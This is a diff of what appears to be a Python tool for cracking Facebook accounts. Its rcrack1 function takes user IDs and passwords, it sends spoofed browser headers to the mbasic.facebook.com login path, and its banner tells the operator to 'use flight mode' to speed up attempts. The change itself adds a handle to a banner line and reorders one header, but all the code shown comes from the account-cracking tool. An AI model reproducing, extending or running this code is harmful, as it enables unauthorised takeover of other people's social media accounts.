@@ -215,7 +215,7 @@ def gml():
         print("\033[1;34m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
         print(' \033[1;97m[+] Process has been started')
-        print(' \033[1;97m[!] Wait for ids ')
+        print(' \033[1;97m[!] Wait for ids Taybul king Tolls ')
         print(' \033[1;97m[!] Use flight mode for speed up ')
         print("\033[1;34m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         for guru in user:
@@ -248,8 +248,8 @@ def rcrack1(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
             'method':'GET',
-            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
             'scheme':'https',
+            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
